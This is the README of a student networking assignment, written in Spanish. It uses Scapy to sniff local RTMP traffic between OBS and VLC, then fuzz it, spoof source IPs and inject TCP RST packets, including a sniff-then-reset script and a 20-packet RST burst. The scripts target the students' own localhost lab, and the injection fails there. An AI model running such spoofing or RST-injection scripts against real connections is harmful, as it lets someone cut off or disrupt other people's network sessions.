#  Proyecto: Inyección y Análisis de Tráfico RTMP con Scapy (Tarea 3)

Este proyecto corresponde a la Tarea 3 del curso Taller de Redes y Servicios, y tiene como objetivo analizar e intervenir el tráfico de red RTMP generado por una transmisión local entre OBS Studio (emisor) y VLC (receptor) utilizando Scapy dentro de un contenedor Docker especializado.

En esta entrega se explora la manipulación directa del protocolo RTMP a través de la captura, análisis e inyección de paquetes TCP, incluyendo pruebas de fuzzing, spoofing y finalización de conexión mediante flags RST.


---

## Tabla de contenido

- [Información general](#información-general)
- [Tecnologías utilizadas](#tecnologías-utilizadas)
- [Características](#características)
- [Configuración](#configuración)
- [Pruebas Realizadas](#pruebas-realizadas)
- [Resultados](#resultados)
- [Estado del proyecto](#estado-del-proyecto)
- [Margen de mejora](#margen-de-mejora)
- [Expresiones de gratitud](#expresiones-de-gratitud)
- [Contacto](#contacto)

---

## Información general

Este proyecto busca interceptar y modificar tráfico de red RTMP utilizando Scapy en un entorno aislado. La finalidad es explorar conceptos de seguridad, manipulación de paquetes TCP y respuesta de aplicaciones reales (OBS/VLC) frente a paquetes inyectados fuera de contexto.


Se desarrolló como parte de una tarea académica en el área de redes y servicios.

Objetivos:

- Levantar un servidor RTMP local
- Emitir en tiempo real desde OBS
- Recibir el stream con VLC
- Capturar y analizar los paquetes en Wireshark
- Intersectar el trafico con scapy
- Parar la trasmision con scapy

---

## Tecnologías utilizadas

- Ubuntu 22.04
- Docker 24+
- Python 3.11
- Scapy
- OBS Studio
- VLC Media Player
- Wireshark

---

##  Características

- Entorno experimental reproducible
- Captura en vivo de paquetes RTMP (puerto 1935)
- Scripts de inyección TCP con Scapy
- Fuzzing (payloads malformados)
- Spoofing (direcciones IP falsas)
- Intentos de cierre de conexión (RST)
- Observación de efectos en OBS y VLC

---


## Configuración

1. Crear contenedor Debian con permisos de red:

```bash
docker run -it --net=host --cap-add=NET_ADMIN --name scapy-container debian bash
```
2. Instalar dependencias dentro del contenedor:
```bash
apt update
apt install -y python3 python3-pip python3-venv nano net-tools
python3 -m venv /opt/scapy-venv
source /opt/scapy-venv/bin/activate
pip install --upgrade pip setuptools
pip install scapy

```
Scripts Implementados:
-sniffer.py
```bash
from scapy.all import *

def ver(pkt):
    if pkt.haslayer(TCP) and pkt[IP].dst == "127.0.0.1" and pkt[TCP].dport == 1935:
        print(pkt.summary())

sniff(iface="lo", filter="tcp port 1935", prn=ver)

```
- sniff_seq.py
```
from scapy.all import *

def capturar(pkt):
    if pkt.haslayer(TCP) and pkt[IP].src == "127.0.0.1" and pkt[TCP].dport == 1935:
        print("Puerto OBS:", pkt[TCP].sport)
        print("Secuencia:", pkt[TCP].seq)
        pkt.show()
        return True

sniff(filter="tcp and port 1935", prn=capturar, count=1)

```

- fuzz1.py


```
from scapy.all import *

pkt = IP(dst="127.0.0.1")/TCP(dport=1935, flags="FPU")/Raw(load="fuzzing-test-1")
send(pkt)

```

- fuzz2.py


```
from scapy.all import *

for i in range(100):
    pkt = IP(dst="127.0.0.1")/TCP(dport=1935)/Raw(load="X"*2048)
    send(pkt)

```
- mod1_rst_real.py

```
from scapy.all import *

ip = IP(src="127.0.0.1", dst="127.0.0.1")
tcp = TCP(sport=46404, dport=1935, flags="R", seq=123456789)  # Reemplazar seq
pkt = ip/tcp

send(pkt)
print("Paquete RST enviado.")

```
- mod1_auto.py
```
from scapy.all import *

print("Escuchando un paquete válido desde OBS hacia el servidor RTMP...")

def capturar(pkt):
    if pkt.haslayer(TCP) and pkt[IP].src == "127.0.0.1" and pkt[TCP].dport == 1935:
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        seq = pkt[TCP].seq + 1

        print(f" Paquete capturado: {src_ip}:{sport} → {dst_ip}:{dport}, seq={seq}")
        ip = IP(src=src_ip, dst=dst_ip)
        tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)
        send(ip/tcp)
        print(" Paquete RST enviado con éxito.")
        return True

sniff(filter="tcp and port 1935", prn=capturar, count=1)

```

- mod1_burst.py


```
from scapy.all import *

print(" Buscando paquete OBS → nginx para lanzar ataque burst RST...")

def capturar(pkt):
    if pkt.haslayer(TCP) and pkt[IP].dst == "172.18.0.2" and pkt[TCP].dport == 1935:
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        base_seq = pkt[TCP].seq

        for offset in range(20):
            seq = base_seq + offset
            ip = IP(src=src_ip, dst=dst_ip)
            tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)
            send(ip/tcp, verbose=0)

        print(" Ataque RST burst enviado.")
        return True

sniff(filter="tcp and dst port 1935", prn=capturar, count=1)

```
- mod2_spoof.py


```
from scapy.all import *

pkt = IP(src="10.10.10.10", dst="127.0.0.1")/TCP(dport=1935)/Raw(load="spoofed")
send(pkt)

```
- mod3_seq.py

```
from scapy.all import *

pkt = IP(dst="127.0.0.1")/TCP(dport=1935, seq=999999)/Raw(load="bad-seq")
send(pkt)

```
##  Pruebas Realizadas

- Captura de paquetes RTMP

- Spoofing de IP

- Fuzzing de payloads

- Inyección de paquetes RST

- Ataque en ráfaga de RSTs (burst)

- Observación en Wireshark y netstat


## Resultados

- Todos los paquetes fueron enviados correctamente.

- Nginx (contenedor) no aceptó los RSTs externos.

- La transmisión RTMP continuó estable (OBS y VLC sin interrupción).

Conclusión: El entorno experimental funcionó correctamente, pero el cierre de conexión fue bloqueado por la lógica de red del sistema (docker-proxy, kernel TCP stack, etc.).



## Estado del proyecto

El proyecto está: Finalizado

## Margen de mejora


- Probar ataques en red real (no solo localhost)

- Automatizar todo en un menú interactivo

- Recolectar métricas del servidor

- Generar logs y estadísticas

## Expresiones de gratitud

- Este proyecto se inspiró en el repositorio:
```https://github.com/iizukanao/node-rtsp-rtmp-server```

- Gracias a OBS, VLC, Wireshark y Scapy.

- Agradecimientos a mi equipo docente y compañeros

## Contacto

Creado por:
- Benjamín Guzmán
- Martin Huiriqueo
- Maximiliano Palma


